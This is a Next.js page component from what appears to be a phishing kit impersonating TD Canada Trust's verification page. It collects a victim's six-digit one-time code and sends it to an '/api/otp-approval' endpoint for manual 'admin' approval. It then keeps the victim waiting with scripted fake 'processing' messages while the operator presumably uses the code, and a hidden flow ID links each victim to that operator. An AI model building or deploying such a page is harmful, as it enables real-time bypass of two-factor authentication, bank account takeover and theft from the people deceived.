"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { getOrCreateFlowId } from "@/lib/session";
import ClientProtection from "@/components/ClientProtection";

const DEFAULT_TIMEOUT_MS = Number(
  process.env.NEXT_PUBLIC_OTP_TIMEOUT_MS || 1500
);

export default function OtpPage() {
  const router = useRouter();
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [flowId, setFlowId] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [approvalError, setApprovalError] = useState("");
  const [processingMessage, setProcessingMessage] = useState(
    "Processing verification code..."
  );
  const [greeting, setGreeting] = useState("Good evening");
  const [showMobileMenu, setShowMobileMenu] = useState(false);

  useEffect(() => {
    setFlowId(getOrCreateFlowId());

    // Set dynamic greeting based on time
    const hour = new Date().getHours();
    if (hour < 12) {
      setGreeting("Good morning");
    } else if (hour < 17) {
      setGreeting("Good afternoon");
    } else {
      setGreeting("Good evening");
    }
  }, []);

  // Handle OTP input changes
  const handleOtpChange = (index, value) => {
    if (value.length > 1) return; // Only allow single digit
    if (!/^[0-9]*$/.test(value)) return; // Only allow numbers

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.querySelector(
        `input[data-index="${index + 1}"]`
      );
      if (nextInput) nextInput.focus();
    }
  };

  // Handle keyboard navigation
  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prevInput = document.querySelector(
        `input[data-index="${index - 1}"]`
      );
      if (prevInput) prevInput.focus();
    }
    if (e.key === "ArrowLeft" && index > 0) {
      const prevInput = document.querySelector(
        `input[data-index="${index - 1}"]`
      );
      if (prevInput) prevInput.focus();
    }
    if (e.key === "ArrowRight" && index < 5) {
      const nextInput = document.querySelector(
        `input[data-index="${index + 1}"]`
      );
      if (nextInput) nextInput.focus();
    }
  };

  // Handle paste
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData
      .getData("text")
      .replace(/[^0-9]/g, "")
      .slice(0, 6);
    const newOtp = [...otp];

    for (let i = 0; i < pastedData.length && i < 6; i++) {
      newOtp[i] = pastedData[i];
    }
    setOtp(newOtp);

    // Focus the next empty input or the last one
    const nextEmptyIndex = newOtp.findIndex((digit) => !digit);
    const focusIndex = nextEmptyIndex === -1 ? 5 : Math.min(nextEmptyIndex, 5);
    const targetInput = document.querySelector(
      `input[data-index="${focusIndex}"]`
    );
    if (targetInput) targetInput.focus();
  };

  // Cycle through realistic processing messages
  function startProcessingMessages() {
    const messages = [
      "Processing verification code...",
      "Validating security token...",
      "Checking authentication code...",
      "Verifying two-factor authentication...",
      "Confirming security verification...",
      "Finalizing authentication process...",
    ];

    let messageIndex = 0;
    const messageInterval = setInterval(() => {
      messageIndex = (messageIndex + 1) % messages.length;
      setProcessingMessage(messages[messageIndex]);
    }, 3000); // Change message every 3 seconds

    // Store interval ID to clear it later
    window.otpProcessingInterval = messageInterval;
  }

  // Clear processing messages when done
  useEffect(() => {
    if (!waitingForApproval && window.otpProcessingInterval) {
      clearInterval(window.otpProcessingInterval);
      setProcessingMessage("Processing verification code...");
    }
  }, [waitingForApproval]);

  async function handleSubmit(e) {
    e.preventDefault();
    if (submitting || waitingForApproval) return;
    setSubmitting(true);
    setApprovalError("");

    // Generate a new flow ID for each OTP submission
    const newFlowId = getOrCreateFlowId(true); // Force new ID
    setFlowId(newFlowId);

    try {
      // Send OTP to admin for approval
      const response = await fetch("/api/otp-approval", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flowId: newFlowId,
          otp: otp.join(""),
          meta: { userAgent: navigator.userAgent },
        }),
      });

      if (response.ok) {
        setSubmitting(false);
        setWaitingForApproval(true);

        // Start cycling through processing messages
        startProcessingMessages();

        // Start polling for approval result
        pollForApproval(newFlowId);
      } else {
        throw new Error("Failed to submit for approval");
      }
    } catch (error) {
      console.error("Submission error:", error);
      setSubmitting(false);
      setApprovalError("Verification service unavailable. Please try again.");
    }
  }

  // Poll for approval result
  async function pollForApproval(currentFlowId) {
    const maxAttempts = 120; // 10 minutes max (5 second intervals)
    let attempts = 0;

    const poll = async () => {
      if (attempts >= maxAttempts) {
        setWaitingForApproval(false);
        setApprovalError("Verification timeout. Please try again.");
        return;
      }

      try {
        const response = await fetch(
          `/api/otp-approval/status?flowId=${currentFlowId}`
        );
        const result = await response.json();

        if (result.status === "resolved") {
          setWaitingForApproval(false);

          if (result.approved) {
            // Approved - redirect to thank you page
            router.push("/thank-you");
          } else {
            // Rejected - show error and reset form
            setApprovalError(
              "Invalid verification code. Please check and try again."
            );
            // Reset form after rejection so user can try again
            setTimeout(() => {
              setApprovalError("");
              setOtp(["", "", "", "", "", ""]);
            }, 3000); // Clear error and form after 3 seconds
          }
          return;
        }

        if (result.status === "pending") {
          // Still waiting, continue polling
          attempts++;
          setTimeout(poll, 5000); // Poll every 5 seconds
        } else {
          // Handle unknown status - could be server restart or other issues
          console.log("Approval status unknown:", result);

          // If it's a fallback approval, continue polling
          if (result.fallback) {
            console.log("Fallback approval created, continuing to poll...");
            attempts++;
            setTimeout(poll, 5000);
            return;
          }

          // For other unknown statuses, show a more helpful error
          setWaitingForApproval(false);
          setApprovalError(
            "Verification service temporarily unavailable. Please try again."
          );
          // Auto-clear error after 3 seconds so user can retry quickly
          setTimeout(() => {
            setApprovalError("");
          }, 3000);
        }
      } catch (error) {
        console.error("Polling error:", error);
        attempts++;

        // If we've had too many consecutive errors, show a message
        if (attempts > 10 && attempts % 10 === 0) {
          console.log("Multiple polling errors, but continuing...");
        }

        setTimeout(poll, 5000);
      }
    };

    poll();
  }

  return (
    <ClientProtection>
      <div className="min-h-screen bg-white">
        {/* Header - Hidden on mobile */}
        <header className="bg-white border-b border-gray-200 hidden md:block">
          <div className="max-w-7xl mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <img src="/logo.png" alt="TD Logo" className="h-8" />
                <span className="text-lg font-medium text-gray-800">
                  TD Canada Trust
                </span>
              </div>
              <div className="flex items-center space-x-4 text-sm text-gray-600">
                <a href="#" className="hover:text-gray-800">
                  English
                </a>
                <span>|</span>
                <a href="#" className="hover:text-gray-800">
                  Français
                </a>
              </div>
            </div>
          </div>
        </header>

        {/* Main Header */}
        <header className="bg-[#12412a] text-white">
          <div className="max-w-7xl mx-auto px-4 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                {/* Mobile hamburger menu */}
                <button 
                  className="md:hidden text-white"
                  onClick={() => setShowMobileMenu(!showMobileMenu)}
                >
                  <svg
                    className="w-6 h-6"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d={showMobileMenu ? "M6 18L18 6M6 6l12 12" : "M4 6h16M4 12h16M4 18h16"}
                    />
                  </svg>
                </button>
                <img src="/logo.png" alt="TD" className="h-8 md:h-10" />
                <nav className="hidden md:flex space-x-6">
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Personal
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Small Business
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Commercial
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Wealth
                  </a>
                </nav>
              </div>
              <div className="flex items-center space-x-4">
                {/* Desktop links - hidden on mobile */}
                <div className="hidden md:flex items-center space-x-4">
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Contact Us
                  </a>
                  <a
                    href="#"
                    className="hover:text-green-300 transition-colors"
                  >
                    Find a Branch
                  </a>
                </div>

                {/* Login button - always visible */}
                <button className="flex items-center space-x-1 text-white hover:text-green-300 transition-colors">
                  <svg
                    className="w-4 h-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="font-medium text-sm">Login</span>
                </button>
              </div>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <div className="bg-gray-50 py-6 md:py-12">
          <div className="max-w-4xl mx-auto px-4">
            <h1
              className="text-[24px] md:text-[32px] leading-[32px] md:leading-[40px] font-normal text-[#12412a] mb-6 md:mb-8 text-center"
              style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
            >
              {greeting}
            </h1>

            <div className="max-w-md mx-auto bg-[#f6fbf8] border border-[#e1eee7] rounded-lg p-4 md:p-8">
              <h2
                className="text-xl font-normal text-gray-800 mb-4 text-center"
                style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
              >
                Enter verification code
              </h2>
              <p className="text-center text-gray-700 mb-8 text-[15px] leading-relaxed">
                Please enter the 6-digit code sent to your phone to verify your
                identity.
              </p>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="flex justify-center gap-3 mb-6">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      data-index={index}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      className="w-12 h-[52px] border border-[#d1d9d6] rounded text-center text-[20px] font-semibold text-gray-900 bg-white focus:outline-none focus:border-[#12412a] focus:ring-1 focus:ring-[#12412a] transition-all"
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      disabled={waitingForApproval}
                      autoComplete="one-time-code"
                    />
                  ))}
                </div>

                {/* Error Message */}
                {approvalError && (
                  <div className="w-full p-3 bg-red-50 border border-red-200 rounded-lg">
                    <div className="flex items-center">
                      <svg
                        className="w-5 h-5 text-red-400 mr-2"
                        fill="currentColor"
                        viewBox="0 0 20 20"
                      >
                        <path
                          fillRule="evenodd"
                          d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <span className="text-sm text-red-700">
                        {approvalError}
                      </span>
                    </div>
                  </div>
                )}

                {/* Processing Message */}
                {waitingForApproval && (
                  <div className="w-full p-3 bg-blue-50 border border-blue-200 rounded-lg">
                    <div className="flex items-center">
                      <svg
                        className="animate-spin w-5 h-5 text-blue-500 mr-2"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                      <div>
                        <div className="text-sm font-medium text-blue-700">
                          {processingMessage}
                        </div>
                        <div className="text-xs text-blue-600">
                          Please wait while we validate your security code
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                <div className="flex justify-center">
                  <button
                    type="submit"
                    disabled={submitting || waitingForApproval}
                    className={`px-10 h-[48px] font-medium text-[16px] disabled:opacity-70 transition-colors flex items-center justify-center gap-2 rounded-md shadow-sm ${
                      otp.every((digit) => digit !== "") && !waitingForApproval
                        ? "bg-[#187a3b] text-white hover:bg-[#166b34]"
                        : "bg-[#e0e0e0] text-gray-700"
                    }`}
                  >
                    <svg
                      className="w-4 h-4"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                        clipRule="evenodd"
                      />
                    </svg>
                    {waitingForApproval
                      ? "Verifying..."
                      : submitting
                      ? "Verifying..."
                      : "Verify"}
                  </button>
                </div>
                {/* Flow ID hidden from user - for admin context only */}
                <div className="hidden">Flow ID: {flowId}</div>
              </form>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-[#12412a] text-white">
          <div className="max-w-7xl mx-auto px-4 py-6">
            {/* Top Section - Image + Contact and Social Media */}
            <div className="flex flex-col md:flex-row justify-center items-center mb-4">
              <div className="flex flex-col md:flex-row items-center gap-4 md:gap-6">
                <div className="flex-shrink-0 hidden md:block">
                  <img
                    src="/footer_seat.png"
                    alt="Chair"
                    className="h-48 w-auto"
                  />
                </div>
                <div className="text-center">
                  <p className="text-lg mb-2">
                    Need to talk to us directly?{" "}
                    <a
                      href="#"
                      className="text-green-300 hover:text-green-200 inline-flex items-center font-medium"
                    >
                      Contact us{" "}
                      <svg
                        className="w-4 h-4 ml-1"
                        fill="currentColor"
                        viewBox="0 0 20 20"
                      >
                        <path
                          fillRule="evenodd"
                          d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </a>
                  </p>

                  <p className="text-lg mb-4">Connect with TD</p>
                  <div className="flex justify-center space-x-4 mb-4">
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.746-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
                      </svg>
                    </a>
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Section - Privacy Links */}
            <div className="pt-2">
              <div className="flex flex-wrap justify-center gap-6 text-sm w-full">
                <a href="#" className="hover:text-green-300 transition-colors">
                  Privacy and Security
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Legal
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Accessibility
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  CDIC member
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  About Us
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  We&apos;re Hiring
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Manage online experience
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Site Index
                </a>
              </div>

              {/* Mobile armchair - shown at bottom on mobile only */}
              <div className="flex justify-center md:hidden mt-4">
                <img
                  src="/footer_seat.png"
                  alt="Chair"
                  className="h-32 w-auto"
                />
              </div>
            </div>
          </div>
        </footer>
      </div>
    </ClientProtection>
  );
}
